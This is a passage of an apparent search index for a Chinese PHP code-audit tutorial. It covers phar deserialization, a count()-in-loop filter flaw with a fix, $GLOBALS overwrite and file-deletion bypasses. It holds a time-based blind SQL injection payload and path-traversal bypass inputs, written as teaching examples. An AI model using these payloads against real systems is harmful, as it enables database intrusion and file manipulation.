\uff0c\u8fd9\u662f\u4e0a\u8ff0\u653b\u51fb\u624b\u6cd5\u6700\u6838\u5fc3\u7684\u5730\u65b9\u3002 (3)the file contents \u8fd9\u90e8\u5206\u5c31\u662f\u6211\u4eec\u60f3\u8981\u538b\u7f29\u5728 phar \u538b\u7f29\u5305\u5185\u90e8\u7684\u6587\u4ef6","title":"1.Phar \u7684\u6587\u4ef6\u7ed3\u6784"},{"location":"web_sec/audit/\u53cd\u5e8f\u5217\u5316/#2-phar","text":"\u793a\u4f8b\u4ee3\u7801\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 <?php class TestObject { } @ unlink ( \"phar.phar\" ); $phar = new Phar ( \"phar.phar\" ); //\u540e\u7f00\u540d\u5fc5\u987b\u4e3aphar $phar -> startBuffering (); $phar -> setStub ( \"<?php __HALT_COMPILER(); ?>\" ); //\u8bbe\u7f6estub $o = new TestObject (); $phar -> setMetadata ( $o ); //\u5c06\u81ea\u5b9a\u4e49\u7684meta-data\u5b58\u5165manifest $phar -> addFromString ( \"test.txt\" , \"test\" ); //\u6dfb\u52a0\u8981\u538b\u7f29\u7684\u6587\u4ef6 //\u7b7e\u540d\u81ea\u52a8\u8ba1\u7b97 $phar -> stopBuffering (); ?> \u56e0\u4e3a\u4e0d\u662f\u6587\u672c\u6587\u4ef6\uff0c\u6211\u4eec\u4f7f\u7528 hexdump \u770b\u4e00\u4e0b\u6587\u4ef6\u7684\u5185\u5bb9 \u5982\u56fe\u6240\u793a\uff1a \u53ef\u4ee5\u6e05\u695a\u5730\u770b\u5230\u6211\u4eec\u7684 TestObject \u7c7b\u5df2\u7ecf\u4ee5\u5e8f\u5217\u5316\u7684\u5f62\u5f0f\u5b58\u5165\u6587\u4ef6\u4e2d \u6211\u4eec\u521a\u521a\u8bf4\u8fc7\u4e86\uff0cphp\u4e00\u5927\u90e8\u5206\u7684\u6587\u4ef6\u7cfb\u7edf\u51fd\u6570\u5728\u901a\u8fc7phar://\u4f2a\u534f\u8bae\u89e3\u6790phar\u6587\u4ef6\u65f6\uff0c\u90fd\u4f1a\u5c06meta-data\u8fdb\u884c\u53cd\u5e8f\u5217\u5316 \u6d4b\u8bd5\u540e\u53d7\u5f71\u54cd\u7684\u51fd\u6570\u5982\u4e0b\uff1a","title":"2.\u5982\u4f55\u521b\u5efa\u4e00\u4e2a\u5408\u6cd5\u7684 Phar\u538b\u7f29\u6587\u4ef6"},{"location":"web_sec/audit/\u53cd\u5e8f\u5217\u5316/#_2","text":"\u6df1\u5165\u7406\u89e3PHP\u53cd\u5e8f\u5217\u5316","title":"\u53c2\u8003"},{"location":"web_sec/audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc6/","text":"\u5ba1\u8ba1\u5c0f\u77e5\u8bc60 \u00b6 for\u5faa\u73af\u4e2d\u7684count \u00b6 \u5f53 count \u51fa\u73b0\u5728 for \u5faa\u73af\u4e2d\uff0c count \u6bcf\u6b21\u90fd\u4f1a\u8ba1\u7b97\uff0c\u5982\u679c\u8fd9\u65f6\u5019\u6570\u7ec4\u53d1\u751f\u4e86\u53d8\u5316\uff0c\u5c31\u4f1a\u6709\u4e00\u4e9b\u5dee\u5f02\u3002 1 2 3 4 5 6 7 8 <?php $a = array ( \"a\" , \"b\" , \"c\" ); for ( $i = 0 ; $i < count ( $a ); $i ++ ) { if ( intval ( $a [ $i ]) < 1 ){ unset ( $a [ $i ]); } } var_dump ( $a ); \u9996\u5148\u53d6\u503c count($a)\uff0c\u6b64\u65f6\u4e3a 3 \u5faa\u73af\u7b2c\u4e00\u6b21\uff0c$i=0\uff0c\u5224\u65ad $a[0] \u662f\u5426\u5c0f\u4e8e 1\uff0c\u8fd4\u56de True\uff0cunset \u6389\uff0c\u6b64\u65f6 $a \u4e3a [\"b\",\"c\"] \u5faa\u73af\u7b2c\u4e8c\u6b21\uff0c i=1\uff0c\u6267\u884c count( i=1\uff0c\u6267\u884c count( a)\uff0c\u6b64\u65f6\u4e3a 2\uff0c\u56e0\u4e3a 1<2\uff0c\u8fdb\u5165\u5faa\u73af\uff0c\u5224\u65ad $a[1]\uff0c\u4e5f\u5c31\u662f b \u662f\u5426\u5c0f\u4e8e 1\uff0c\u8fd4\u56de True\uff0cunset \u6389\uff0c\u6b64\u65f6\u6570\u7ec4\u5269\u4e00\u4e2a $a[2]\uff0c\u4e5f\u5c31\u662f c \u5faa\u73af\u7b2c\u4e09\u6b21\uff0c i=2\uff0c\u6267\u884c count( i=2\uff0c\u6267\u884c count( a)\uff0c\u6b64\u65f6\u4e3a 1\uff0c\u56e0\u4e3a 2>1\uff0c\u8fdb\u4e0d\u4e86\u5faa\u73af\u4e86\uff0c\u81ea\u7136\u5c31\u4e0d\u80fd\u5230 if \u548c unset \u8fd9\u5757\u3002 \u4e00\u6bb5\u5b9e\u9645\u6817\u5b50\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 <?php $idlist = \"0,1,2))and(case+when+(select+sleep(10)+from+cms_users+limit+1)+then+1+else+2+end)+--+ \" ; if ( is_string ( $idlist ) ) { $tmp = explode ( ',' , $idlist ); for ( $i = 0 ; $i < count ( $tmp ); $i ++ ) { $tmp [ $i ] = ( int ) $tmp [ $i ]; if ( $tmp [ $i ] < 1 ) unset ( $tmp [ $i ]); } $idlist = array_unique ( $tmp ); foreach ( $idlist as $value ){ echo $value ; echo \" \\n \" ; } } \u53d8\u91cfidlist\u4e2d\u7684\u201d0\u201d\u88ab\u8fc7\u6ee4\u6389\u4e86\uff0c\u201d1\u201d\u548c\u201c2))and(case+when+(select+sleep(10)+from+cms_users+limit+1)+then+1+else+2+end)+\u2013+ \u201d\u88ab\u4fdd\u7559\u4e86\u4e0b\u6765\uff0c\u8fd9\u8bf4\u660e\u6761\u4ef6\u5224\u65ad\u548cunset\u8bed\u53e5\u53ea\u8d77\u5230\u4e86\u4e00\u90e8\u5206\u4f5c\u7528\u3002\u4e3a\u4ec0\u4e48\u4f1a\u8fd9\u6837\uff1f\u5728for\u5faa\u73af\u4e2d\uff0c\u7b2c\u4e00\u6b21\u5faa\u73af\u7684\u65f6\u5019\uff0c\u7531\u4e8e tmp[0]< 1\uff0c\u56e0\u6b64 tmp[0]< 1\uff0c\u56e0\u6b64 tmp[0]\u4f1a\u88abunset\u6389\uff0c\u90a3\u4e48\u7b2c\u4e8c\u6b21\u5faa\u73af\u4e2d\u7684count( tmp)\u5b9e\u9645\u4e0a\u6bd4\u7b2c\u4e00\u6b21\u5faa\u73af\u5c11\u4e861\uff08\u5c11\u4e86\u88abunset\u6389\u7684 tmp)\u5b9e\u9645\u4e0a\u6bd4\u7b2c\u4e00\u6b21\u5faa\u73af\u5c11\u4e861\uff08\u5c11\u4e86\u88abunset\u6389\u7684 tmp[0]\uff09\uff0c\u6240\u4ee5\u6700\u7ec8$tmp[2]\u6839\u672c\u6ca1\u6709\u88ab\u5f3a\u5236\u7c7b\u578b\u8f6c\u6362\uff0c\u4e8e\u662f\u201c2))and(case+when+(select+sleep(10)+from+cms_users+limit+1)+then+1+else+2+end)+\u2013+ \u201d\u88ab\u4fdd\u7559\u4e86\u4e0b\u6765\u3002 \u4fee\u590d\u65b9\u6848: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 <?php $idlist = \"0,1,2))and(case+when+(select+sleep(10)+from+cms_users+limit+1)+then+1+else+2+end)+--+ \" ; if ( is_string ( $idlist ) ) { $tmp = explode ( ',' , $idlist ); $idlist = []; for ( $i = 0 ; $i < count ( $tmp ); $i ++ ) { $val = ( int ) $tmp [ $i ]; if ( $val > 0 && ! in_array ( $val , $idlist )) $idlist [] = $val ; } foreach ( $idlist as $value ){ echo $value ; echo \" \\n \" ; } \u8fd9\u91cc\u540c\u65f6\u6d89\u53ca\u5230intval\u51fd\u6570\u7684\u4e00\u70b9\u77e5\u8bc6\uff1a 1 2 3 php > $a = intval('a'); php > var_dump($a); int(0) \u5e76\u4e14\u67e5\u770b\u5b98\u65b9\u6587\u6863\uff1a \u6210\u529f\u65f6\u8fd4\u56de var \u7684 integer \u503c\uff0c\u5931\u8d25\u65f6\u8fd4\u56de 0\u3002 \u7a7a\u7684 array \u8fd4\u56de 0\uff0c\u975e\u7a7a\u7684 array \u8fd4\u56de 1\u3002 \u6700\u5927\u7684\u503c\u53d6\u51b3\u4e8e\u64cd\u4f5c\u7cfb\u7edf\u3002 32 \u4f4d\u7cfb\u7edf\u6700\u5927\u5e26\u7b26\u53f7\u7684 integer \u8303\u56f4\u662f -2147483648 \u5230 2147483647\u3002\u4e3e\u4f8b\uff0c\u5728\u8fd9\u6837\u7684\u7cfb\u7edf\u4e0a\uff0c intval('1000000000000') \u4f1a\u8fd4\u56de 2147483647\u300264 \u4f4d\u7cfb\u7edf\u4e0a\uff0c\u6700\u5927\u5e26\u7b26\u53f7\u7684 integer \u503c\u662f 9223372036854775807\u3002 \u603b\u7ed3 \u00b6 \u6bd4\u5982\u4e0b\u6b21\u5728\u5ba1\u8ba1\u4e2d\uff0c\u53ef\u4ee5\u7559\u610f for \u5faa\u73af\u4e2d\u662f\u5426\u662f\u7528\u4e86 count \u8fd9\u79cd\u91cd\u65b0\u8ba1\u7b97\u7684\u51fd\u6570\uff0c\u5e76\u4e14\u5728\u5faa\u73af\u5185\u64cd\u4f5c\u4e86\u8fd9\u4e2a\u53d8\u91cf\u3002\u6709\u53ef\u80fd\u5bfc\u81f4\u65f6\u95f4\u76f2\u6ce8 \u5168\u5c40\u53d8\u91cf\u8986\u76d6 \u00b6 1 2 3 4 5 6 7 8 9 10 11 foreach($_REQUEST as $_k=>$_v) { if( strlen($_k)>0 && preg_match('/^(cfg_|GLOBALS)/',$_k) && !isset($_COOKIE[$_k]) ) { exit('Request var not allow!'); } } foreach(Array('_GET','_POST','_COOKIE') as $_request) { foreach($$_request as $_k => $_v) ${$_k} = $_v; } \u7a0d\u5fae\u7406\u89e3\u4e00\u4e0b\u4ee3\u7801\uff0c\u540e\u9762\u4e00\u4e2a foreach \u5faa\u73af\u5c31\u662f\u5bf9\u4e8e\u4e09\u4e2a\u6570\u7ec4\u53d6\u51fa\u6bcf\u4e2a\u5bf9\u5e94\u7684key\u548cvalue\uff0c\u5c06\u8fd9\u4e9bkey\u6ce8\u518c\u4e3a\u5168\u5c40\u7684\u53d8\u91cf \u63a7\u5236 $_GET \u4e3a _POST[GLOBALS][xixi] = 1; \u4e5f\u5c31\u662f $_GET[_POST[GLOBALS][xixi]]=1 \u5f53\u6267\u884c\u68c0\u6d4b\u65f6\uff0c\u7531\u4e8e $key \u662f _POST \uff0c\u6240\u4ee5\u4e0d\u4f1a\u88ab\u68c0\u6d4b\uff0c\u6b64\u65f6 post \u53c2\u6570\u662f\u7a7a\uff0c\u7136\u540e\u6267\u884c\u5230\u4e0b\u9762\u3002 \u6267\u884c foreach \u65f6\uff0c\u7b2c\u4e00\u6b21\u5faa\u73af\uff0c\u6b64\u65f6 $_request \u662f _GET \uff0c\u7136\u540e $_k \u662f _POST \uff0c\u6240\u4ee5\u662f ${_POST}['GLOBALS']['xixi'] = 1; \u7136\u540e\u6267\u884c\u5230\u7b2c\u4e8c\u6b21 foreach\uff0c\u6b64\u65f6 $_request \u4e3a _POST \uff0c $_k \u5c31\u662f\u6570\u7ec4\u7684\u952e\uff0c\u81ea\u7136\u5c31\u662f GLOBALS \uff0c\u6240\u4ee5\u6267\u884c\u7684\u5c31\u662f ${GLOBALS}['xixi']=1 \u8fd9\u6837\u5c31\u8986\u76d6\u4e86 $GLOBALS \u4e86\u3002\u3002 \u603b\u7ed3 \u00b6 \u5e38\u89c1\u7684cms\u4e2d\u6709\u5f88\u591a\u4e2a\u4f1a\u51fa\u73b0\u8fd9\u6837\u7684\u4ee3\u7801\uff0c\u5982\u679c\u8fc7\u6ee4\u4e0d\u4e25\u5c31\u4f1a\u5bfc\u81f4\u6076\u610f\u6ce8\u518c\u5168\u5c40\u53d8\u91cf php\u6570\u7ec4 \u00b6 1 2 3 4 5 <?php $stuff = array ( 0x100000000 => 'admin' , 1 => 'user' ); $array = [ 'admin' , 'user' ]; var_dump ( $stuff === $array ); php5.5.38\u6d4b\u8bd5\u7ed3\u679c\u4e3atrue php7\u7684\u7ed3\u679c\u4e3afalse \u53c2\u8003 \u00b6 https://www.freebuf.com/vuls/207026.html https://xz.aliyun.com/t/5676","title":"\u5ba1\u8ba1\u5c0f\u77e5\u8bc60"},{"location":"web_sec/audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc6/#0","text":"","title":"\u5ba1\u8ba1\u5c0f\u77e5\u8bc60"},{"location":"web_sec/audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc6/#forcount","text":"\u5f53 count \u51fa\u73b0\u5728 for \u5faa\u73af\u4e2d\uff0c count \u6bcf\u6b21\u90fd\u4f1a\u8ba1\u7b97\uff0c\u5982\u679c\u8fd9\u65f6\u5019\u6570\u7ec4\u53d1\u751f\u4e86\u53d8\u5316\uff0c\u5c31\u4f1a\u6709\u4e00\u4e9b\u5dee\u5f02\u3002 1 2 3 4 5 6 7 8 <?php $a = array ( \"a\" , \"b\" , \"c\" ); for ( $i = 0 ; $i < count ( $a ); $i ++ ) { if ( intval ( $a [ $i ]) < 1 ){ unset ( $a [ $i ]); } } var_dump ( $a ); \u9996\u5148\u53d6\u503c count($a)\uff0c\u6b64\u65f6\u4e3a 3 \u5faa\u73af\u7b2c\u4e00\u6b21\uff0c$i=0\uff0c\u5224\u65ad $a[0] \u662f\u5426\u5c0f\u4e8e 1\uff0c\u8fd4\u56de True\uff0cunset \u6389\uff0c\u6b64\u65f6 $a \u4e3a [\"b\",\"c\"] \u5faa\u73af\u7b2c\u4e8c\u6b21\uff0c i=1\uff0c\u6267\u884c count( i=1\uff0c\u6267\u884c count( a)\uff0c\u6b64\u65f6\u4e3a 2\uff0c\u56e0\u4e3a 1<2\uff0c\u8fdb\u5165\u5faa\u73af\uff0c\u5224\u65ad $a[1]\uff0c\u4e5f\u5c31\u662f b \u662f\u5426\u5c0f\u4e8e 1\uff0c\u8fd4\u56de True\uff0cunset \u6389\uff0c\u6b64\u65f6\u6570\u7ec4\u5269\u4e00\u4e2a $a[2]\uff0c\u4e5f\u5c31\u662f c \u5faa\u73af\u7b2c\u4e09\u6b21\uff0c i=2\uff0c\u6267\u884c count( i=2\uff0c\u6267\u884c count( a)\uff0c\u6b64\u65f6\u4e3a 1\uff0c\u56e0\u4e3a 2>1\uff0c\u8fdb\u4e0d\u4e86\u5faa\u73af\u4e86\uff0c\u81ea\u7136\u5c31\u4e0d\u80fd\u5230 if \u548c unset \u8fd9\u5757\u3002 \u4e00\u6bb5\u5b9e\u9645\u6817\u5b50\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 <?php $idlist = \"0,1,2))and(case+when+(select+sleep(10)+from+cms_users+limit+1)+then+1+else+2+end)+--+ \" ; if ( is_string ( $idlist ) ) { $tmp = explode ( ',' , $idlist ); for ( $i = 0 ; $i < count ( $tmp ); $i ++ ) { $tmp [ $i ] = ( int ) $tmp [ $i ]; if ( $tmp [ $i ] < 1 ) unset ( $tmp [ $i ]); } $idlist = array_unique ( $tmp ); foreach ( $idlist as $value ){ echo $value ; echo \" \\n \" ; } } \u53d8\u91cfidlist\u4e2d\u7684\u201d0\u201d\u88ab\u8fc7\u6ee4\u6389\u4e86\uff0c\u201d1\u201d\u548c\u201c2))and(case+when+(select+sleep(10)+from+cms_users+limit+1)+then+1+else+2+end)+\u2013+ \u201d\u88ab\u4fdd\u7559\u4e86\u4e0b\u6765\uff0c\u8fd9\u8bf4\u660e\u6761\u4ef6\u5224\u65ad\u548cunset\u8bed\u53e5\u53ea\u8d77\u5230\u4e86\u4e00\u90e8\u5206\u4f5c\u7528\u3002\u4e3a\u4ec0\u4e48\u4f1a\u8fd9\u6837\uff1f\u5728for\u5faa\u73af\u4e2d\uff0c\u7b2c\u4e00\u6b21\u5faa\u73af\u7684\u65f6\u5019\uff0c\u7531\u4e8e tmp[0]< 1\uff0c\u56e0\u6b64 tmp[0]< 1\uff0c\u56e0\u6b64 tmp[0]\u4f1a\u88abunset\u6389\uff0c\u90a3\u4e48\u7b2c\u4e8c\u6b21\u5faa\u73af\u4e2d\u7684count( tmp)\u5b9e\u9645\u4e0a\u6bd4\u7b2c\u4e00\u6b21\u5faa\u73af\u5c11\u4e861\uff08\u5c11\u4e86\u88abunset\u6389\u7684 tmp)\u5b9e\u9645\u4e0a\u6bd4\u7b2c\u4e00\u6b21\u5faa\u73af\u5c11\u4e861\uff08\u5c11\u4e86\u88abunset\u6389\u7684 tmp[0]\uff09\uff0c\u6240\u4ee5\u6700\u7ec8$tmp[2]\u6839\u672c\u6ca1\u6709\u88ab\u5f3a\u5236\u7c7b\u578b\u8f6c\u6362\uff0c\u4e8e\u662f\u201c2))and(case+when+(select+sleep(10)+from+cms_users+limit+1)+then+1+else+2+end)+\u2013+ \u201d\u88ab\u4fdd\u7559\u4e86\u4e0b\u6765\u3002 \u4fee\u590d\u65b9\u6848: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 <?php $idlist = \"0,1,2))and(case+when+(select+sleep(10)+from+cms_users+limit+1)+then+1+else+2+end)+--+ \" ; if ( is_string ( $idlist ) ) { $tmp = explode ( ',' , $idlist ); $idlist = []; for ( $i = 0 ; $i < count ( $tmp ); $i ++ ) { $val = ( int ) $tmp [ $i ]; if ( $val > 0 && ! in_array ( $val , $idlist )) $idlist [] = $val ; } foreach ( $idlist as $value ){ echo $value ; echo \" \\n \" ; } \u8fd9\u91cc\u540c\u65f6\u6d89\u53ca\u5230intval\u51fd\u6570\u7684\u4e00\u70b9\u77e5\u8bc6\uff1a 1 2 3 php > $a = intval('a'); php > var_dump($a); int(0) \u5e76\u4e14\u67e5\u770b\u5b98\u65b9\u6587\u6863\uff1a \u6210\u529f\u65f6\u8fd4\u56de var \u7684 integer \u503c\uff0c\u5931\u8d25\u65f6\u8fd4\u56de 0\u3002 \u7a7a\u7684 array \u8fd4\u56de 0\uff0c\u975e\u7a7a\u7684 array \u8fd4\u56de 1\u3002 \u6700\u5927\u7684\u503c\u53d6\u51b3\u4e8e\u64cd\u4f5c\u7cfb\u7edf\u3002 32 \u4f4d\u7cfb\u7edf\u6700\u5927\u5e26\u7b26\u53f7\u7684 integer \u8303\u56f4\u662f -2147483648 \u5230 2147483647\u3002\u4e3e\u4f8b\uff0c\u5728\u8fd9\u6837\u7684\u7cfb\u7edf\u4e0a\uff0c intval('1000000000000') \u4f1a\u8fd4\u56de 2147483647\u300264 \u4f4d\u7cfb\u7edf\u4e0a\uff0c\u6700\u5927\u5e26\u7b26\u53f7\u7684 integer \u503c\u662f 9223372036854775807\u3002","title":"for\u5faa\u73af\u4e2d\u7684count"},{"location":"web_sec/audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc6/#_1","text":"\u6bd4\u5982\u4e0b\u6b21\u5728\u5ba1\u8ba1\u4e2d\uff0c\u53ef\u4ee5\u7559\u610f for \u5faa\u73af\u4e2d\u662f\u5426\u662f\u7528\u4e86 count \u8fd9\u79cd\u91cd\u65b0\u8ba1\u7b97\u7684\u51fd\u6570\uff0c\u5e76\u4e14\u5728\u5faa\u73af\u5185\u64cd\u4f5c\u4e86\u8fd9\u4e2a\u53d8\u91cf\u3002\u6709\u53ef\u80fd\u5bfc\u81f4\u65f6\u95f4\u76f2\u6ce8","title":"\u603b\u7ed3"},{"location":"web_sec/audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc6/#_2","text":"1 2 3 4 5 6 7 8 9 10 11 foreach($_REQUEST as $_k=>$_v) { if( strlen($_k)>0 && preg_match('/^(cfg_|GLOBALS)/',$_k) && !isset($_COOKIE[$_k]) ) { exit('Request var not allow!'); } } foreach(Array('_GET','_POST','_COOKIE') as $_request) { foreach($$_request as $_k => $_v) ${$_k} = $_v; } \u7a0d\u5fae\u7406\u89e3\u4e00\u4e0b\u4ee3\u7801\uff0c\u540e\u9762\u4e00\u4e2a foreach \u5faa\u73af\u5c31\u662f\u5bf9\u4e8e\u4e09\u4e2a\u6570\u7ec4\u53d6\u51fa\u6bcf\u4e2a\u5bf9\u5e94\u7684key\u548cvalue\uff0c\u5c06\u8fd9\u4e9bkey\u6ce8\u518c\u4e3a\u5168\u5c40\u7684\u53d8\u91cf \u63a7\u5236 $_GET \u4e3a _POST[GLOBALS][xixi] = 1; \u4e5f\u5c31\u662f $_GET[_POST[GLOBALS][xixi]]=1 \u5f53\u6267\u884c\u68c0\u6d4b\u65f6\uff0c\u7531\u4e8e $key \u662f _POST \uff0c\u6240\u4ee5\u4e0d\u4f1a\u88ab\u68c0\u6d4b\uff0c\u6b64\u65f6 post \u53c2\u6570\u662f\u7a7a\uff0c\u7136\u540e\u6267\u884c\u5230\u4e0b\u9762\u3002 \u6267\u884c foreach \u65f6\uff0c\u7b2c\u4e00\u6b21\u5faa\u73af\uff0c\u6b64\u65f6 $_request \u662f _GET \uff0c\u7136\u540e $_k \u662f _POST \uff0c\u6240\u4ee5\u662f ${_POST}['GLOBALS']['xixi'] = 1; \u7136\u540e\u6267\u884c\u5230\u7b2c\u4e8c\u6b21 foreach\uff0c\u6b64\u65f6 $_request \u4e3a _POST \uff0c $_k \u5c31\u662f\u6570\u7ec4\u7684\u952e\uff0c\u81ea\u7136\u5c31\u662f GLOBALS \uff0c\u6240\u4ee5\u6267\u884c\u7684\u5c31\u662f ${GLOBALS}['xixi']=1 \u8fd9\u6837\u5c31\u8986\u76d6\u4e86 $GLOBALS \u4e86\u3002\u3002","title":"\u5168\u5c40\u53d8\u91cf\u8986\u76d6"},{"location":"web_sec/audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc6/#_3","text":"\u5e38\u89c1\u7684cms\u4e2d\u6709\u5f88\u591a\u4e2a\u4f1a\u51fa\u73b0\u8fd9\u6837\u7684\u4ee3\u7801\uff0c\u5982\u679c\u8fc7\u6ee4\u4e0d\u4e25\u5c31\u4f1a\u5bfc\u81f4\u6076\u610f\u6ce8\u518c\u5168\u5c40\u53d8\u91cf","title":"\u603b\u7ed3"},{"location":"web_sec/audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc6/#php","text":"1 2 3 4 5 <?php $stuff = array ( 0x100000000 => 'admin' , 1 => 'user' ); $array = [ 'admin' , 'user' ]; var_dump ( $stuff === $array ); php5.5.38\u6d4b\u8bd5\u7ed3\u679c\u4e3atrue php7\u7684\u7ed3\u679c\u4e3afalse","title":"php\u6570\u7ec4"},{"location":"web_sec/audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc6/#_4","text":"https://www.freebuf.com/vuls/207026.html https://xz.aliyun.com/t/5676","title":"\u53c2\u8003"},{"location":"web_sec/audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc61/","text":"\u5ba1\u8ba1\u5c0f\u77e5\u8bc61 \u00b6 file_put_contents\u3001copy\u3001file_get_contents\u7b49\u8bfb\u53d6\u5199\u5165\u64cd\u4f5c\u4e0eunlink\u3001file_exists\u7b49\u5220\u9664\u5224\u65ad\u6587\u4ef6\u51fd\u6570\u4e4b\u95f4\u5bf9\u4e8e\u8def\u5f84\u5904\u7406\u7684\u5dee\u5f02\u5bfc\u81f4\u7684\u5220\u9664\u7ed5\u8fc7 \u00b6 1 2 3 4 5 6 7 8 9 <?php $filename = __DIR__ . '/tmp/' . $user [ 'name' ]; $data = $user [ 'info' ]; file_put_contents ( $filename , $data ); if ( file_exists ( $filename )) { unlink ( $filename ); } ?> \u67e5\u770bphp\u6e90\u7801\uff0c\u5176\u5b9e\u6211\u4eec\u80fd\u53d1\u73b0\uff0cphp\u8bfb\u53d6\u3001\u5199\u5165\u6587\u4ef6\uff0c\u90fd\u4f1a\u8c03\u7528php_stream_open_wrapper_ex\u6765\u6253\u5f00\u6d41\uff0c\u800c\u5224\u65ad\u6587\u4ef6\u5b58\u5728\u3001\u91cd\u547d\u540d\u3001\u5220\u9664\u6587\u4ef6\u7b49\u64cd\u4f5c\u5219\u65e0\u9700\u6253\u5f00\u6587\u4ef6\u6d41\u3002 \u6211\u4eec\u8ddf\u4e00\u8ddfphp_stream_open_wrapper_ex\u5c31\u4f1a\u53d1\u73b0\uff0c\u5176\u5b9e\u6700\u540e\u4f1a\u4f7f\u7528tsrm_realpath\u51fd\u6570\u6765\u5c06filename\u7ed9\u6807\u51c6\u5316\u6210\u4e00\u4e2a\u7edd\u5bf9\u8def\u5f84\u3002\u800c\u6587\u4ef6\u5220\u9664\u7b49\u64cd\u4f5c\u5219\u4e0d\u4f1a\uff0c\u8fd9\u5c31\u662f\u4e8c\u8005\u7684\u533a\u522b\u3002 \u6240\u4ee5\uff0c\u5982\u679c\u6211\u4eec\u4f20\u5165\u7684\u662f\u6587\u4ef6\u540d\u4e2d\u5305\u542b\u4e00\u4e2a\u4e0d\u5b58\u5728\u7684\u8def\u5f84\uff0c\u5199\u5165\u7684\u65f6\u5019\u56e0\u4e3a\u4f1a\u5904\u7406\u6389\u201c../\u201d\u7b49\u76f8\u5bf9\u8def\u5f84\uff0c\u6240\u4ee5\u4e0d\u4f1a\u51fa\u9519\uff1b\u5224\u65ad\u3001\u5220\u9664\u7684\u65f6\u5019\u56e0\u4e3a\u4e0d\u4f1a\u5904\u7406\uff0c\u6240\u4ee5\u5c31\u4f1a\u51fa\u73b0\u201cNo such file or directory\u201d\u7684\u9519\u8bef\u3002 \u4e8e\u662f\u4e4elinux\u53ef\u4ee5\u901a\u8fc7 xxxxx/../test.php \u3001 test.php/. windows\u53ef\u4ee5\u901a\u8fc7 test.php:test test.ph< \u6765\u7ed5\u8fc7\u6587\u4ef6\u5220\u9664 \u6b64\u5916\u53d1\u73b0\u8fd8\u53ef\u4ee5\u4f7f\u7528\u4f2a\u534f\u8bae php://filter/resource=1.php \u5728file_ge_contents\u3001copy\u7b49\u4e2d\u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9\uff0c\u5374\u53ef\u4ee5\u7ed5\u8fc7\u6587\u4ef6\u5220\u9664 extract()\u3001parse_str() \u7b49\u53d8\u91cf\u8986\u76d6 \u00b6 extract\u51fd\u6570\u4ece\u6570\u7ec4\u5bfc\u5165\u53d8\u91cf\uff08 $_GET \u3001 $_POST \uff09,\u5c06\u6570\u7ec4\u7684\u952e\u540d\u4f5c\u4e3a\u53d8\u91cf\u7684\u503c\u3002\u800cparse_str\u51fd\u6570\u5219\u662f\u4ece\u7c7b\u4f3cname=Bill&age=60\u7684\u683c\u5f0f\u5b57\u7b26\u4e32\u89e3\u6790\u53d8\u91cf.\u5982\u679c\u5728\u4f7f\u7528\u7b2c\u4e00\u4e2a\u51fd\u6570\u6ca1\u6709\u8bbe\u7f6e EXTR_SKIP \u6216\u8005 EXTR_PREFIX_SAME \u7b49\u5904\u7406\u53d8\u91cf\u51b2\u7a81\u7684\u53c2\u6570\u65f6\u3001\u7b2c\u4e8c\u4e2a\u51fd\u6570\u6ca1\u6709\u4f7f\u7528\u6570\u7ec4\u63a5\u53d7\u53d8\u91cf\u65f6\u5c06\u4f1a\u5bfc\u81f4\u53d8\u91cf\u8986\u76d6\u7684\u95ee\u9898 intval()\u6574\u6570\u6ea2\u51fa\u3001\u5411\u4e0b\u53d6\u6574\u548c\u6574\u5f62\u5224\u65ad\u7684\u95ee\u9898 \u00b6 32\u4f4d\u7cfb\u7edf\u6700\u5927\u7684\u5e26\u7b26\u53f7\u8303\u56f4\u4e3a-2147483648 \u5230 2147483647\uff0c64\u4f4d\u6700\u5927\u7684\u662f 9223372036854775807\uff0c\u56e0\u6b64\uff0c\u572832\u4f4d\u7cfb\u7edf\u4e0a intval(\u20181000000000000\u2019) \u4f1a\u8fd4\u56de 2147483647 \u6b64\u5916intval(10.99999)\u4f1a\u8fd4\u56de10\uff0cintval\u548cint\u7b49\u53d6\u6574\u90fd\u662f\u2019\u622a\u65ad\u2019\u53d6\u6574\uff0c\u5e76\u4e0d\u662f\u56db\u820d\u4e94\u5165 intval\u51fd\u6570\u8fdb\u53bb\u53d6\u6574\u65f6\uff0c\u662f\u76f4\u5230\u9047\u4e0a\u6570\u5b57\u6216\u8005\u6b63\u8d1f\u53f7\u624d\u5f00\u59cb\u8fdb\u884c\u8f6c\u6362\uff0c\u4e4b\u540e\u5728\u9047\u5230\u975e\u6570\u5b57\u6216\u8005\u7ed3\u675f\u7b26\u53f7\uff08\\0\uff09\u65f6\u7ed3\u675f\u8f6c\u6362 \u6d6e\u70b9\u6570\u7cbe\u5ea6\u95ee\u9898\u5bfc\u81f4\u7684\u5927\u5c0f\u6bd4\u8f83\u95ee\u9898 \u00b6 \u5f53\u5c0f\u6570\u5c0f\u4e8e10^-16\u540e\uff0cPHP\u5bf9\u4e8e\u5c0f\u6570\u5c31\u5927\u5c0f\u4e0d\u5206\u4e86 var_dump(1.000000000000000 == 1) >> TRUE var_dump(1.0000000000000001 == 1) >> TRUE is_numeric()\u4e0eintval()\u7279\u6027\u5dee\u5f02 \u00b6 is_numeric\u51fd\u6570\u5728\u5224\u65ad\u662f\u5426\u662f\u6570\u5b57\u65f6\u4f1a\u5ffd\u7565\u5b57\u7b26\u4e32\u5f00\u5934\u7684\u2019 